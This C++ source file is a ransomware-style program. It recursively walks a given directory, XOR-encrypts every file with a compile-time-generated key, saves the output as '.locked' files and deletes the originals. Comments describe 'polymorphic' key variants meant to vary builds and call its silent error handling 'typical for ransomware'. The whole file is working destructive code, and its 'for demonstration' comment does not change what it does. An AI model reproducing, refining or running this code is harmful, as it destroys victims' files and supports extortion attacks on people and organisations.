#include <iostream>
#include <fstream>
#include <vector>
#include <array>
#include <filesystem>
#include <random>
#include <type_traits>

namespace fs = std::filesystem;

// Polymorphic AES key generation using template metaprogramming
template <int Seed, typename = void>
struct KeyGenerator {
    static constexpr std::array<unsigned char, 32> generate() {
        std::array<unsigned char, 32> key{};
        for (int i = 0; i < 32; ++i) {
            key[i] = static_cast<unsigned char>((i * Seed + 0x9E3779B9) & 0xFF);
        }
        return key;
    }
};

// Variant key generator with different algorithm
template <int Seed>
struct KeyGenerator<Seed, typename std::enable_if<(Seed % 2 == 0)>::type> {
    static constexpr std::array<unsigned char, 32> generate() {
        std::array<unsigned char, 32> key{};
        for (int i = 0; i < 32; ++i) {
            key[i] = static_cast<unsigned char>((i ^ Seed * 0x85EBCA6B) & 0xFF);
        }
        return key;
    }
};

// XOR "encryption" function with compile-time key selection
template <int KeyVariant>
void processFile(const fs::path& filePath) {
    constexpr auto key = KeyGenerator<__COUNTER__ % 256 + KeyVariant>::generate();
    
    std::ifstream input(filePath, std::ios::binary);
    if (!input) return;
    
    std::vector<unsigned char> buffer(
        (std::istreambuf_iterator<char>(input)),
        std::istreambuf_iterator<char>()
    );
    input.close();
    
    // Simple XOR "encryption" for demonstration
    for (size_t i = 0; i < buffer.size(); ++i) {
        buffer[i] ^= key[i % key.size()];
    }
    
    fs::path encryptedPath = filePath.string() + ".locked";
    std::ofstream output(encryptedPath, std::ios::binary);
    output.write(reinterpret_cast<char*>(buffer.data()), buffer.size());
    output.close();
    
    fs::remove(filePath); // Remove original file
}

// Entry point with randomized template instantiation
int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <target_directory>\n";
        return 1;
    }
    
    // Compile-time random selection of encryption variant
    constexpr int variants[] = {__TIME__[0] % 4, __TIME__[1] % 4, __TIME__[3] % 4, __TIME__[4] % 4};
    
    try {
        for (const auto& entry : fs::recursive_directory_iterator(argv[1])) {
            if (!entry.is_regular_file()) continue;
            
            // Select variant based on compile-time constants
            switch (variants[entry.path().string().length() % 4]) {
                case 0: processFile<1>(entry.path()); break;
                case 1: processFile<2>(entry.path()); break;
                case 2: processFile<3>(entry.path()); break;
                default: processFile<4>(entry.path()); break;
            }
        }
    } catch (const std::exception& e) {
        // Silent failure - typical for ransomware
    }
    
    return 0;
}